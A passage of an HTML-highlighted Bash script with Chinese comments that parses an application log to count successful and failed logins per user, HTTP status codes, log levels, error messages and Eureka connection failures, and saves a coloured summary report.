class=\"hljs-comment\"\u003e# 重置颜色，恢复默认颜色\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 定义日志文件和输出文件\u003c/span\u003e\nLOG_FILE=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e\"\u003c/span\u003e           \u003cspan class=\"hljs-comment\"\u003e# 第一个参数为日志文件的路径\u003c/span\u003e\nOUTPUT_FILE=\u003cspan class=\"hljs-string\"\u003e\"log_analysis.txt\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 输出文件，保存分析结果\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 声明关联数组，用于存储登录计数\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003edeclare\u003c/span\u003e -A successful_users  \u003cspan class=\"hljs-comment\"\u003e# 关联数组，存储成功登录的用户及其次数：用户名 -\u003e 次数\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003edeclare\u003c/span\u003e -A failed_users      \u003cspan class=\"hljs-comment\"\u003e# 关联数组，存储失败登录的用户及其次数：用户名 -\u003e 次数\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 定义初始的 HTTP 状态码及其计数（初始化为 0）\u003c/span\u003e\nSTATUS_CODES=(\u003cspan class=\"hljs-string\"\u003e\"200:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"201:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"302:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"400:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"401:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"403:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"404:0\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"500:0\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-comment\"\u003e# 检查日志文件是否存在\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ ! -f \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${RED}\u003c/span\u003eError: Log file \u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e not found.\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 如果文件不存在，输出错误信息\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1  \u003cspan class=\"hljs-comment\"\u003e# 脚本退出并返回错误码\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# 分析登录成功和失败的函数\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eanalyze_logins\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-comment\"\u003e# 处理成功登录的记录\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e IFS= \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -r line; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        username=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e\"\u003c/span\u003e | awk -F\u003cspan class=\"hljs-string\"\u003e\"'\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 从日志行中提取用户名\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# 如果用户已经存在于数组中，则增加该用户的登录计数\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ -n \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${successful_users[$username]+_}\u003c/span\u003e\"\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n            successful_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e]=$((successful_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e] + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n            successful_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e]=1  \u003cspan class=\"hljs-comment\"\u003e# 第一次登录，初始化计数为 1\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x3C; \u0026#x3C;(grep \u003cspan class=\"hljs-string\"\u003e\"LoginSuccessLogger\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 过滤出包含 'LoginSuccessLogger' 的行\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 处理失败登录的记录\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e IFS= \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -r line; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        username=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e\"\u003c/span\u003e | awk -F\u003cspan class=\"hljs-string\"\u003e\"'\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 从日志行中提取用户名\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# 如果用户已经存在于数组中，则增加该用户的失败登录计数\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ -n \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${failed_users[$username]+_}\u003c/span\u003e\"\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n            failed_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e]=$((failed_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e] + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n            failed_users[\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e]=1  \u003cspan class=\"hljs-comment\"\u003e# 第一次失败，初始化计数为 1\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x3C; \u0026#x3C;(grep \u003cspan class=\"hljs-string\"\u003e\"LoginFailureLogger\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 过滤出包含 'LoginFailureLogger' 的行\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# 分析日志中的 HTTP 状态码\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eanalyze_http_statuses\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-comment\"\u003e# 处理每一行日志，查找状态码\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e IFS= \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e -r line; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        code=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$line\u003c/span\u003e\"\u003c/span\u003e | grep -oP \u003cspan class=\"hljs-string\"\u003e'Status: \\K.*'\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 提取状态码\u003c/span\u003e\n        found=0\n        \u003cspan class=\"hljs-comment\"\u003e# 遍历 STATUS_CODES 数组，检查状态码是否存在\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${!STATUS_CODES[@]}\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n            existing_entry=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${STATUS_CODES[$i]}\u003c/span\u003e\"\u003c/span\u003e\n            existing_code=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$existing_entry\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e -f1)  \u003cspan class=\"hljs-comment\"\u003e# 获取状态码\u003c/span\u003e\n            existing_count=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$existing_entry\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e -f2)  \u003cspan class=\"hljs-comment\"\u003e# 获取当前计数\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$existing_code\u003c/span\u003e\"\u003c/span\u003e -eq \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e\"\u003c/span\u003e ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n                new_count=$((existing_count + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))  \u003cspan class=\"hljs-comment\"\u003e# 如果状态码存在，增加计数\u003c/span\u003e\n                STATUS_CODES[\u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e]=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${existing_code}\u003c/span\u003e:\u003cspan class=\"hljs-variable\"\u003e${new_count}\u003c/span\u003e\"\u003c/span\u003e\n                \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e \u0026#x3C; \u0026#x3C;(grep \u003cspan class=\"hljs-string\"\u003e\"HTTP.*Status: \"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e)  \u003cspan class=\"hljs-comment\"\u003e# 过滤出包含 'Status: ' 的行\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# 分析日志中的错误信息\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eanalyze_log_errors\u003c/span\u003e\u003c/span\u003e(){\n    \u003cspan class=\"hljs-comment\"\u003e# 输出日志级别的统计信息\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${YELLOW}\u003c/span\u003e[+] Log Level Counts:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    log_levels=$(grep -oP \u003cspan class=\"hljs-string\"\u003e'(?\u0026#x3C;=Z  )\\w+'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003esort\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003euniq\u003c/span\u003e -c)  \u003cspan class=\"hljs-comment\"\u003e# 提取日志级别并排序统计\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$log_levels\u003c/span\u003e\"\u003c/span\u003e | awk -v blue=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$BLUE\u003c/span\u003e\"\u003c/span\u003e -v yellow=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$YELLOW\u003c/span\u003e\"\u003c/span\u003e -v red=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RED\u003c/span\u003e\"\u003c/span\u003e -v reset=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RESET\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{\n        if ($2 == \"INFO\") color=blue;       # INFO级别使用蓝色\n        else if ($2 == \"WARN\") color=yellow; # WARN级别使用黄色\n        else if ($2 == \"ERROR\") color=red;  # ERROR级别使用红色\n        else color=reset;                   # 其他日志级别恢复默认颜色\n        printf \"%s%6s %s%s\\n\", color, $1, $2, reset\n    }'\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 输出所有的错误消息\u003c/span\u003e\n    error_messages=$(grep \u003cspan class=\"hljs-string\"\u003e' ERROR '\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e | awk -F\u003cspan class=\"hljs-string\"\u003e' ERROR '\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $2}'\u003c/span\u003e)\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${RED}\u003c/span\u003e[+] ERROR Messages:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$error_messages\u003c/span\u003e\"\u003c/span\u003e | awk -v red=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RED\u003c/span\u003e\"\u003c/span\u003e -v reset=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RESET\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print red $0 reset}'\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# Eureka 服务连接失败的错误\u003c/span\u003e\n    eureka_errors=$(grep \u003cspan class=\"hljs-string\"\u003e'Connect to http://localhost:8761.*failed: Connection refused'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$LOG_FILE\u003c/span\u003e\"\u003c/span\u003e)\n    eureka_count=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$eureka_errors\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ewc\u003c/span\u003e -l)  \u003cspan class=\"hljs-comment\"\u003e# 统计 Eureka 错误的数量\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${YELLOW}\u003c/span\u003e[+] Eureka Connection Failures:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${YELLOW}\u003c/span\u003eCount: $eureka_count\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 输出 Eureka 错误的数量\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$eureka_errors\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e -n 2 | awk -v yellow=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$YELLOW\u003c/span\u003e\"\u003c/span\u003e -v reset=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RESET\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print yellow $0 reset}'\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 输出最新的 Eureka 错误\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# 显示最终的分析结果\u003c/span\u003e\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003edisplay_results\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${BLUE}\u003c/span\u003e----- Log Analysis Report -----\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 输出成功登录统计信息\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${GREEN}\u003c/span\u003e[+] Successful Login Counts:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    total_success=0\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${!successful_users[@]}\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        count=\u003cspan class=\"hljs-variable\"\u003e${successful_users[$user]}\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${GREEN}\u003c/span\u003e%6s %s\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\\n\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$count\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示每个用户的成功登录次数\u003c/span\u003e\n        total_success=$((total_success + count))  \u003cspan class=\"hljs-comment\"\u003e# 累加成功登录总数\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${GREEN}\u003c/span\u003e\\nTotal Successful Logins: $total_success\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示成功登录总数\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 输出失败登录统计信息\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${RED}\u003c/span\u003e[+] Failed Login Attempts:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    total_failed=0\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${!failed_users[@]}\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        count=\u003cspan class=\"hljs-variable\"\u003e${failed_users[$user]}\u003c/span\u003e\n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${RED}\u003c/span\u003e%6s %s\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\\n\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$count\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$user\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示每个用户的失败登录次数\u003c/span\u003e\n        total_failed=$((total_failed + count))  \u003cspan class=\"hljs-comment\"\u003e# 累加失败登录总数\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${RED}\u003c/span\u003e\\nTotal Failed Login Attempts: $total_failed\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示失败登录总数\u003c/span\u003e\n\n    \u003cspan class=\"hljs-comment\"\u003e# 输出 HTTP 状态码分布\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\\n\u003cspan class=\"hljs-variable\"\u003e${CYAN}\u003c/span\u003e[+] HTTP Status Code Distribution:\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e\n    total_requests=0\n    \u003cspan class=\"hljs-comment\"\u003e# 按状态码进行排序\u003c/span\u003e\n    IFS=$\u003cspan class=\"hljs-string\"\u003e'\\n'\u003c/span\u003e sorted=($(\u003cspan class=\"hljs-built_in\"\u003esort\u003c/span\u003e -n -t\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e -k1 \u0026#x3C;\u0026#x3C;\u0026#x3C;\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${STATUS_CODES[*]}\u003c/span\u003e\"\u003c/span\u003e))\n    \u003cspan class=\"hljs-built_in\"\u003eunset\u003c/span\u003e IFS\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e entry \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${sorted[@]}\u003c/span\u003e\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n        code=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$entry\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e -f1)  \u003cspan class=\"hljs-comment\"\u003e# 获取状态码\u003c/span\u003e\n        count=$(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$entry\u003c/span\u003e\"\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e':'\u003c/span\u003e -f2)  \u003cspan class=\"hljs-comment\"\u003e# 获取该状态码的计数\u003c/span\u003e\n        total_requests=$((total_requests + count))  \u003cspan class=\"hljs-comment\"\u003e# 累加 HTTP 请求总数\u003c/span\u003e\n        \n        \u003cspan class=\"hljs-comment\"\u003e# 根据状态码的类型选择颜色\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [[ \u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e =~ ^2 ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e color=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$GREEN\u003c/span\u003e\"\u003c/span\u003e   \u003cspan class=\"hljs-comment\"\u003e# 2xx 状态码使用绿色\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e [[ \u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e =~ ^3 ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e color=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$YELLOW\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-comment\"\u003e# 3xx 状态码使用黄色\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e [[ \u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e =~ ^4 || \u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e =~ ^5 ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e color=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$RED\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 4xx 和 5xx 状态码使用红色\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e color=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$CYAN\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 其他状态码使用青色\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n        \n        \u003cspan class=\"hljs-built_in\"\u003eprintf\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${color}\u003c/span\u003e%6s %s\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\\n\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$count\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$code\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示每个状态码及其计数\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e -e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e${CYAN}\u003c/span\u003e\\nTotal HTTP Requests Tracked: $total_requests\u003cspan class=\"hljs-variable\"\u003e${RESET}\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示 HTTP 请求总数\u003c/span\u003e\n}\n\n\u003cspan class=\"hljs-comment\"\u003e# 主执行过程\u003c/span\u003e\nanalyze_logins  \u003cspan class=\"hljs-comment\"\u003e# 调用分析登录函数\u003c/span\u003e\nanalyze_http_statuses  \u003cspan class=\"hljs-comment\"\u003e# 调用分析 HTTP 状态码函数\u003c/span\u003e\ndisplay_results | \u003cspan class=\"hljs-built_in\"\u003etee\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$OUTPUT_FILE\u003c/span\u003e\"\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# 显示结果并保存到输出文件\u003c/span\u003e\nanalyze_log_errors | \u003cspan class=\"hljs-built_in\"\u003etee\u003c/span\u003e -a \u003cspan class=\"hljs-string\"\u003e\"\u003cspan 